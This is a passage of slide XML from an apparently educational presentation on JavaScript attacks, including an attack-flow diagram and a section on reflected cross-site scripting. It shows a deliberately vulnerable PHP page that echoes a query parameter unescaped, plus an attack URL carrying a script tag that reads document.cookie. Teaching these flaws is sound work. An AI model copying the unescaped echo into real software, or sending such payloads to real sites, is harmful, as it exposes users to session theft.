            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Browser Extension Exploits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Text 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616648" y="6548199"/>
            <a:ext cx="3675936"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Abuse extension permissions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="Text 56"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8633103" y="6548199"/>
            <a:ext cx="1380768"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High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="Text 57"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10354389" y="6548199"/>
            <a:ext cx="2532221" cy="230981"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1800"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Medium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3542" y="560665"/>
            <a:ext cx="7788116" cy="637103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3. How JavaScript Attacks Work</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713542" y="1270992"/>
            <a:ext cx="4143970" cy="509707"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Flow Diagram</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="preencoded.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="924997" y="2055614"/>
            <a:ext cx="12780407" cy="4795718"/>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39532" y="3277170"/>
            <a:ext cx="660149" cy="660149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11251380" y="5315794"/>
            <a:ext cx="1927637" cy="1114002"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack Consequences</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="135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2766" y="3278407"/>
            <a:ext cx="660149" cy="660149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822031" y="5687127"/>
            <a:ext cx="1927636" cy="371334"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>JS Executes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9"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6620" y="3278407"/>
            <a:ext cx="660149" cy="660149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6405884" y="5501460"/>
            <a:ext cx="1927636" cy="742668"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable App</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1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0473" y="3278407"/>
            <a:ext cx="660149" cy="660149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3989737" y="5501460"/>
            <a:ext cx="1927636" cy="742668"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Injection Vector</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13"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61123" y="3278407"/>
            <a:ext cx="660149" cy="660149"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520778" y="5501460"/>
            <a:ext cx="1927636" cy="742668"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Craft Payload</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713542" y="7057430"/>
            <a:ext cx="13203317" cy="619601"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The attack flow demonstrates how malicious JavaScript moves from the attacker through various injection vectors into vulnerable applications, ultimately executing in the victim's browser with full page privileges and causing serious security consequences.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537579" y="1023938"/>
            <a:ext cx="5177552" cy="432792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4. Attack Vectors &amp; Techniques</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="1490543"/>
            <a:ext cx="3889415" cy="346115"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4.1 Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="1870472"/>
            <a:ext cx="2077164" cy="259675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="373B48"/>
                </a:solidFill>
                <a:latin typeface="Mona Sans Semi Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Semi Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>How XSS Works</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="2256949"/>
            <a:ext cx="9555123"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XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="2530316"/>
            <a:ext cx="9555123" cy="178356"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable Code Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="2803684"/>
            <a:ext cx="9555123" cy="1991201"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2921"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2530673" y="2803684"/>
            <a:ext cx="9568934" cy="1991201"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1043"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669143" y="2907506"/>
            <a:ext cx="9291995" cy="1783556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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 search.php --&gt;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&lt;?php</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$search = $_GET['q'];</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&lt;html&gt;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&lt;body&gt;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&lt;h1&gt;Search Results&lt;/h1&gt;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&lt;p&gt;You searched for: &lt;?php echo $search; ?&gt;&lt;/p&gt;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&lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>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&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="4889897"/>
            <a:ext cx="9555123" cy="178356"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attack URL:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="5163264"/>
            <a:ext cx="9555123" cy="386001"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 15068"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2530673" y="5163264"/>
            <a:ext cx="9568934" cy="386001"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5381"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2669143" y="5267087"/>
            <a:ext cx="9291995"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https://example.com/search.php?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="5644277"/>
            <a:ext cx="9555123" cy="178356"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="52586B"/>
                </a:solidFill>
                <a:latin typeface="Funnel Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="Funnel Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Funnel Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What Happens:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="5917644"/>
            <a:ext cx="138470" cy="17299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Mona Sans Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="6137553"/>
            <a:ext cx="3128605" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="373B48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2537579" y="6237208"/>
            <a:ext cx="3128605"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User clicks malicious link</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5750719" y="5917644"/>
            <a:ext cx="138470" cy="17299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Mona Sans Light" pitchFamily="34" charset="0"/>
                <a:ea typeface="Mona Sans Light" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Mona Sans Light" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5750719" y="6137553"/>
            <a:ext cx="3128724" cy="15240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="373B48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5750719" y="6237208"/>
            <a:ext cx="3128724"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Server reflects input without sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
